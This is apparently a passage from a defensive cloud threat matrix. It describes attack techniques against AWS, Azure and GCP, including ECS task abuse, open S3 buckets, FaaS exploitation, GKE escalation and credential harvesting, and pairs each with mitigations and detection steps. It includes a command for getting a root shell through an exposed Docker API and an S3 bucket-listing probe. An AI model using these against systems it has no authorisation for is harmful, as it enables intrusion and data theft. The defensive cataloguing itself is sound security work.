| Disable Unnecessary Ports and Services | Ensure ports and services that are publicly accessible are locked down and disabled if necessary. In the case of Docker, port 2376 is the ssl version of Dockerd socket should not be open to the Internet. |


Detection


This can be detected by monitoring the commands being run through the cloud API. Most users/processes should not be listing and pulling images in a registry. If this happens it should be investigated. Any type of suspicious account activity should be monitored and flagged. This can include unusual log on times, connecting from unexpected devices, password changes, as well as multiple log on attempts.




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.[Rhino Labs. (2019, August). Exploiting AWS ECR and ECS with the Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.](https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/)


2.[Rhino Labs. (2019, September). Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.](https://github.com/RhinoSecurityLabs/ccat)


3.[DEF CON 27 Cloud Village. (2019, December). Chris Le Roy - Build to Hack Hack to Build. Retrieved June 17, 2020.](http://1.https:/www.youtube.com/watch?v=1FB58EVWAOU)


4.https://docs.docker.com/engine/security/https Retrieved July 29, 2020.


# Exploit Elastic Container Service (ECS) Task Definitions(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may attempt to exploit the task definitions that are run via Elastic Container Services on AWS.This tactic can be used to exfiltrate information or escalate privileges. ECS is AWS’s container management service which is capable of running, stopping, and managing Docker containers on a cluster.


Task definitions are used to define one or more containers that are to be run and are required to run Docker containers in ECS. A task definition can specify parameters such as which Docker image you want to use, the IAM role to be used, logging configurations, etc.. These task definitions can be exploited to allow for malicious task definitions to be sent.


Examples




| **Name** | **Description** |
| --- | --- |
| Rhino Security Labs Blog Post (Pacu Tool) | This blog post outlines an attack where an adversary starts with a low-level role with access to ECS and then finds a task role that has permissions that are elevated to what they need. A task definition is edited to be malicious and run a command to pull a shell script from a server being hosted by the adversary. A shell script payload to exfiltrate credentials is created and then using the AWS CLI is used to run a command that is used to run the malicious task definition, this is done using run-task API. The adversary can then receive exfiltrated credentials and use them to continue attacks. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Least Privilege | | Ensure that the Task Roles attached to ECS task definitions are following the principle of least privilege. |
|  | *AWS* | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | *Azure* | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | *GCP* | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |
| Task Definition Edit Privileges | | If it is necessary to have a task definition run a role that requires an elevated level of permission, ensure that that task definition cannot be altered by everyone. To properly configure the roles given for task definitions, IAM roles will be used. They can specify which users have permissions to read, write, and execute the task definitions. To create the IAM roles for the task the IAM console will be used. On the console a role will be created for an AWS service (Elastic Container Service). Then the permissions to be given will be applied via Tags. Once the role is created it can be attached to the users needing the permissions. More details can be found here:https://docs.aws.amazon.com/AmazonECS/latest/userguide/task-iam-roles.html. |


Detection


This can be difficult to detect due to the fact that once the attack is completed the malicious task definition created is deregistered and the environment is in the same state as it was before the attack occurred.


References


1.https://github.com/RhinoSecurityLabs/pacu/tree/master/modules/ecs\_\_enum\_task\_def. Accessed June 30, 2020.


2.https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/. Accessed June 30, 2020.


# Exploiting Public-Facing Application(version 1.0)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services.


If an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies. It should be assumed that a public web server is a weak link inside a cloud deployment and that some level of compromise is possible. Using Zero Trust principles to isolate the web server to the maximum extent possible inside a cloud deployment will reduce the likelihood of several Cloud tactics and techniques. Docker APIs are commonly exposed publicly and can be used to gain access to a shell on the container, which are also known to run as root by default.


For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.


Examples




| **Name** | **Description** |
| --- | --- |
| Shodan.io | Entering queries into Shodan.io like “Product ‘Docker’” or “Product ‘aws’” will yield results to various open APIs and public-facing services. |
| Exposed Docker Port | Identifying an open port associated with Docker (2376 is the most common open port by default) can lead to finding running containers and images. Most containers run with default root privileges, so running*docker -H 192.168.1.7:2376 exec -it <container name> /bin/bash*will automatically give you root once logged in. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| [Application Isolation and Sandboxing](https://attack.mitre.org/mitigations/M1048) | | Application isolation will limit what other processes and system features the exploited target can access. |
| [Exploit Protection](https://attack.mitre.org/mitigations/M1050) | | Web Application Firewalls may be used to limit exposure of applications to prevent exploit traffic from reaching the application. |
| [Network Segmentation](https://attack.mitre.org/mitigations/M1030) | | Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure. |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | *AWS* | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | *Azure* | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | *GCP* | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |
| [Update Software](https://attack.mitre.org/mitigations/M1051) | | Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure. |
| [Vulnerability Scanning](https://attack.mitre.org/mitigations/M1016) | | Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure. |
| Disable Unnecessary Ports and Services | | Ensure ports and services that are publicly accessible are locked down and disabled if necessary. In the case of Docker, port 2376. |
| Assign Permissions to Containers | | By default, many containers will run as root. Before provisioning the container, set explicit permissions and users in either the Dockerfile or User ID at runtime to ensure this does not happen. |


Detection


Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Cloud-based Web Application Firewalls tied to proxies may detect improper requests attempting exploitation.


References


1.<https://www.shodan.io/search?query=product+%22docker%22>. Accessed July 14, 2020.


2.<https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124>. Accessed July 14, 2020.


3.[Medium. (2020, June). Bryant Hagadorn – Docker and Kubernetes – root vs. Privileged. Retrieved July 14, 2020.](https://itnext.io/docker-and-kubernetes-root-vs-privileged-9d2a37453dec)


4.<https://unit42.paloaltonetworks.com/hunting-the-public-cloud-for-exposed-hosts-and-misconfigurations/>. Accessed July 14, 2020.


# Exploiting New Vulnerabilities in Managed Cloud Services(version 1.0)


**Cloud Service Label: PaaS, SaaS**


Description


Cloud Service Providers (CSPs) have various services within their cloud environments that can be seamlessly integrated and utilized for a customer’s needs. The purpose of managed cloud services is to remove the need to install and manage common software applications. These managed services move the responsibility of maintaining, patching, and updating to the CSPs and the vendors that provide the managed service.


Managed cloud services can be used at both the infrastructure and application levels. The infrastructure level includes services for providing architecture recommendations, system administration, monitoring, DNS management, Kubernetes support and many others. The application level provides support for packages like Ansible, Elasticsearch, LogStash, database management with MongoDB, and various other services as well.


While managed cloud services are generally thought to be more secure than running a custom or IaaS hosted application or tool, they are still susceptible to vulnerabilities and exploitation and often provide less visibility to customers than comparable IaaS-hosted versions. The Cloud Service Provider will normally remove the worry of vulnerability management through automatic patching and updating, but it is still important to be aware of potential vulnerabilities through managed cloud services, because these could still lead to exploitation of customer assets.


Examples




| **Name** | **Description** |
| --- | --- |
| Azure Sphere Talos Vulnerabilities | A blog article put out by Talos Intelligence highlights several vulnerabilities found in the Azure Sphere service, which is a cloud System on a Chip (SoC) platform designed to implement IoT application security. These vulnerabilities include information disclosure, unsigned code execution, socket memory corruption, denial of service, and privilege escalation. |


Mitigations




| **Mitigations** | | **Description** |
| --- | --- | --- |
| Audit |  | Perform periodic audits to ensure that best security practices are implemented and that unusual /unexplainable events are not occurring |
|  | *AWS* | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:[**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html**](https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html)**.** |
|  | *Azure* | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:[**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs**](https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs)**.** |
|  | *GCP* | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:[**https://cloud.google.com/logging/docs/audit**](https://cloud.google.com/logging/docs/audit)**.** |
| Setting IAM Policies and Permissions |  | Implement least privilege and assign roles and permissions to users as necessary. |
|  | *AWS* | Amazon’s article for IAM security best practices in AWS covers topics including creating individual IAM users, using AWS managed policies, roles, frequent key rotation and others. Full details can be found at[**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html**](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)**.** |
|  | *Azure* | Microsoft’s article for IAM security best practices in Azure covers topics including centralizing identity management, turning on conditional access, use role-based access control, using Azure AD for storage authentication, and others. Full details can be found at[**https://docs.microsoft.com/en-us/azure/security/fundamentals/identity-management-best-practices**](https://docs.microsoft.com/en-us/azure/security/fundamentals/identity-management-best-practices)**.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Leverage IDS Rules to independently detect unusual network events within the cloud | Implementing Snort rules 54501 – 53504 will detect attempts at exploitations specific to the above Azure Sphere vulnerabilities. |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Monitoring for Regional Activity | Tools like Splunk or even CloudSploit have the ability to alert based on region and ingest CloudTrail logs. In CloudSploit, a plugin called EC2 Max Count can be configured to alert after a certain threshold of EC2 instances is met. Real-Time Events service is another feature of CloudSploit that allows alerts for activity in unused regions. |


References


1.<https://blog.talosintelligence.com/2020/07/vuln-spotlight-azure-sphere-july-2020.html>Accessed August 11, 2020.


# Exploit S3 (Simple Storage Service) Permissions(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may be able to exploit the permissions of S3 buckets to be able to gain access and exfiltrate data. S3 buckets are Amazon’s Simple Storage Services. They are used to store data such as log files, JavaScript libraries, system backups, images, etc.. This service allows users to store and access data easily, but can be an issue if permissions are not configured properly. This can lead to read access, download permissions to anyone who views the bucket, and open upload permissions, both of which can be exploited by an adversary.


Examples




| **Name** | **Description** |
| --- | --- |
| Rhino Security Labs Blog Post | In this walkthrough the adversary first finds the region in which they wish to exploit. Once the region is determined they then start to probe for buckets. This is accomplished by general querying and enumeration of bucket names. To determine if a bucket is found that has unfettered access permissions the command, “sudo aws s3 ls s3://$bucketname/ --region $region” can be run with the expectation of returning a directory listing. Once the S3 bucket is identified if an open upload policy can allow an adversary to upload malicious Javascript (or other scripts that are able to perform malicious activity) to all application users. Depending on permissions set buckets can allow for system backups to be downloaded, as well as source code, log files that may contain usernames and passwords, and other critical information. This was tested utilizing Alexa’s top 10,000 sites which resulted in 107 buckets. 57% of the buckets had download permissions to anyone who viewed them, 12% had open upload permissions, and 8% had both permission errors. |
| Twilio S3 Bucket Exploited | The attackers found an open S3 bucket to exploit. Once this was found the JavaScript SDK was altered. The development kit was vandalized as part of an automated cyber-crime campaign that preys on JavaScript code in open S3 buckets to inject malicious ads into browsers. |


Mitigations




| **Mitigation** | | **Description** | |
| --- | --- | --- | --- |
| Web Application Firewall | | Ensuring that cloud applications are configured behind a web application firewall can make it harder for an adversary to determine a target’s IP address. | |
| Least Privilege |  | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | AWS | | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at[**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege**](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege)**.** |
|  | Azure | | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task)**.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal)**.** |
|  | GCP | | [To implement least privilege in GCP it](https://cloud.google.com/blog/products/application-development/least-privilege-for-cloud-functions-using-cloud-iam)is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:[**https://cloud.google.com/iam/docs/understanding-roles**](https://cloud.google.com/iam/docs/understanding-roles)**.**To assign these roles IAM service accounts are used and complete details can be found at:[**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege**](https://cloud.google.com/iam/docs/using-iam-securely#least_privilege)**.** |
|  |  |  |  |


Detection


This can be detected by unknown uploads or downloads to/from the S3 buckets.


References


1.https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/. Accessed June 30, 2020.


# Exploiting FaaS - AWS Lambda/Azure Functions/Logic Apps(version 1.2)


**Cloud Service Label: PaaS**


Description


Both Azure and AWS employ “serverless” code functionality that can be set to automatically trigger by other events within the cloud API. Coding for these functions is a new paradigm that isn’t well understood from a security perspective. Many of the vulnerabilities associated with other programming paradigms apply but the mitigations often don’t. There really aren’t code scanners that focus on FaaS code. It’s often not feasible to protect FaaS functions with proxies or firewalls. Restricting inputs to FaaS functions is often antithetical to their reason for existing. FaaS functions often take inputs from logs that are not controlled by an application developer. Sample code has already been released showing what is possible if vulnerable FaaS functions ingest log messages that have been cleverly formatted to take advantage of coding vulnerabilities. Exploiting FaaS functions can be used both to gain initial access to a cloud enterprise, collect intelligence on internal cloud assets, to elevate privileges during an existing intrusion, and to evade detection during intrusion.


Examples




| **Name** | **Tactic** | **Description** |
| --- | --- | --- |
| Puresec |  | Blog posts about exploiting FaaS functions |
| NetSPI | Privilege escalation | Demonstrates code to extract Bearer tokens from FaaS functions in Azure if you can insert code into an existing FaaS function. These tokens may have expansive rights though they are usually limited to a particular Azure service. |
| NetSPI | Persistence | FaaS functions can be used to maintain persistence after initial access has been made. Automation accounts can create scheduled tasks or web hook to maintain persistence. |
| NetSPI | Defense Evasion | FaaS functions can be utilized for defense evasion. There are testing functionality for automation accounts where code and other commands can be run to avoid detection since this is not logged. |
| Puma Security | Privilege escalation, persistence | Open source scripts to access FaaS credentials from AWS, Azure and GCP |
| Rhino Security Labs | Privilege escalation | FaaS functions can be manipulated to include custom versions of python libraries and malicious code. In an example demonstrated by Rhino Security Labs, the boto3 python library was customized and uploaded to a new Lambda layer to include code that steals the function’s environment variables. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud.Frequently check API logs for lambda/function creation events. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Secure Coding | | Avoid directly processing any input that can be generated directly by a user. Parse all inputs to functions carefully. |
| Limit Access | | Provision FaaS functions with the minimum absolute permissions possible. In AWS, ensure lambda:CreateFunction and lambda:UpdateFunctionConfiguration permissions are locked down. In Azure use Managed Identities for authorization and authentication since this makes such accesses easier to audit. |
| Associate function with a VNET or VPC | | This may cost more in Azure’s case, but the function can be protected by CSP network protections such as security groups to prevent credentials from being used from unexpected locations |


Detection


Detecting the presence of corrupted FaaS apps is exceedingly difficult currently. More likely side effects that result from such corruption like illicit network communications or unexplained account creations are more likely to be noticed in logging. For instance in Azure service accounts (MSI) the diagnostic logs may show a token authentication from non-Microsoft address spaces using a client that is not a Microsoft agent.


https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/References


1.https://github.com/puresec/sas-top-10 Retrieved Feb 20,2020


2.https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8611 Retrieved May 14, 2020


3.https://blog.netspi.com/gathering-bearer-tokens-azure/#4 Retrieved June 8, 2020


4.https://pumasecurity.io/resources/blog/RSAC-2020-Defending-Serverless-Infrastructure-in-the-Cloud Retrieved June 9,2020 Accessed July 21, 2020


# GKE (Google Kubernetes Engine) Kubernetes Attack(version 1.1)


**Cloud Service Label: IaaS, PaaS**


Description


Kubernetes is becoming extremely popular and due to containers being popular in the cloud this has led to many clients of providers such as GCP, AWS, and Azure utilizing Kubernetes to orchestrate containerized applications. Google Kubernetes Engine (GKE) is Google Cloud Platform’s Kubernetes management system. There are ways that an adversary might exploit GKE to perform privilege escalation.


Examples




| **Name** | **Description** |
| --- | --- |
| Rhino Security Labs | Start with compromised GCP Credentials. Then list compute engine VM instances and log HTTP requests and responses. Then adversary would steal Kubelet bootstrap TLS credentials from the HTTP requests and responses log file that was listed. They would then submit certificate signing request to Kubernetes control plane, act as Kubernetes worker node, and steal Kubernetes secrets with worker node credentials; these steps can be repeated until the adversary is able to gain cluster-admin access. Once the cluster-admin access is gained they can list Kubernetes pods, execute into container, steal container service account, access the computer engine instance meta data server, steal GCP service account token, and access GCP cloud resources. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Two Factor Authentication | Use two factor authentication for user accounts. |
| Enable GKE Metadata Server | Consider enabling GKE Metadata Server which improves security and replaces Compute Engine VM instances Metadata Server. |
| Least Privilege | Use the concept of least privilege for management accounts. |


Detection


References


1.<https://cseweb.ucsd.edu/~savage/papers/CCS09.pdf>. Accessed July 2, 2020.


# Harvesting Credentials via Cloud APIs


(version 1.0)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


Adversaries may steal the credentials of cloud administrators using well-known credential harvesting techniques.


Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available cloud services, such as cloud storage services. Compromised credentials may also grant an adversary increased privilege to specific cloud systems or resources. Harvested credentials can allow an adversary initial access, the ability to maintain persistence, escalate privileges, move laterally, collect, and exfiltrate data.


Examples




| **Name** | **Description** |
| --- | --- |
| Get-AZPasswords | Get-AZPasswords is an open source PowerShell script to dump Azure credentials. It does so utilizing PowerShell CMDlets. This is a tool that can be used after initial access is obtained. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Consider using Cloud shells | | Azure offers admins a command line interface directly from the web console that already has been authenticated. This potentially eliminates the need for admins to download cloud credentials locally to their workstation. |
| [Audit](https://attack.mitre.org/mitigations/M1047) | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. Frequently check role assignments to ensure proper permissions are set and still required. . |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:[**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html**](https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html)**.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:[**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs**](https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs)**.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:[**https://cloud.google.com/logging/docs/audit**](https://cloud.google.com/logging/docs/audit)**.** |
| [Filter Network Traffic](https://attack.mitre.org/mitigations/M1037) | | Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting on cloud-based systems along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data. |
|  | AWS | An AWS environment can be configured with network ACLs (access control lists) to allow or deny inbound and outbound traffic. This can be accomplished by accessing Amazon VPC and navigating to either inbound or outbound rules depending on the rule the user wishes to add and they can be added, removed, or edited from that panel. Full details about ACLs and how to add rules in AWS can be found here:**https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html.** |
|  | Azure | In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. This can be done multiple ways including the Azure Portal, Azure PowerShell, and Azure CLI (Command Line Interface). Depending on the method used to implement this the procedure can vary, but will include the need to create a security group, create a network security group, associate that network security group with a specific subnet and then create security rules that are associated to the inbound and outbound rules for that subnet. Full details on how to configure this utilizing the various methods can be found below: Azure Portal:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic** Azure PowerShell:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-powershell** Azure CLI:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-cli** |
| Use a Bastion Host | | Accessing IaaS resources for administration is best done from within the cloud by means of a bastion server that preferably resides in the same VPC/Virtual network as the IaaS assets. By restricting all external network traffic except this bastion host from accessing privileged ports on IaaS assets, the chance of damage done by exploited accounts is diminished. |
| [Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032) | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | AWS | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | Azure | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | GCP | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| [Key Policies](https://attack.mitre.org/mitigations/M1027) | | In cloud environments, consider rotating access keys within a certain number of days for reducing the effectiveness of stolen credentials. |
| [Privileged Account Management](https://attack.mitre.org/mitigations/M1026) | | For IaaS Windows server VM’s, audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. Use RBAC to limit the impact anyone account can have on your cloud assets. General “GOD” level accounts that have access to all cloud resources should never be used for daily administration within the cloud. Rather use accounts that have been delegated admin access to certain resources. In Azure for example, using an account with the owner role at the subscription level for everyday tasks is a risky proposition. Once the infrastructure has been created and refined these credentials are no longer required for most admin tasks. Limit credential overlap across systems to prevent access if account credentials are obtained. |
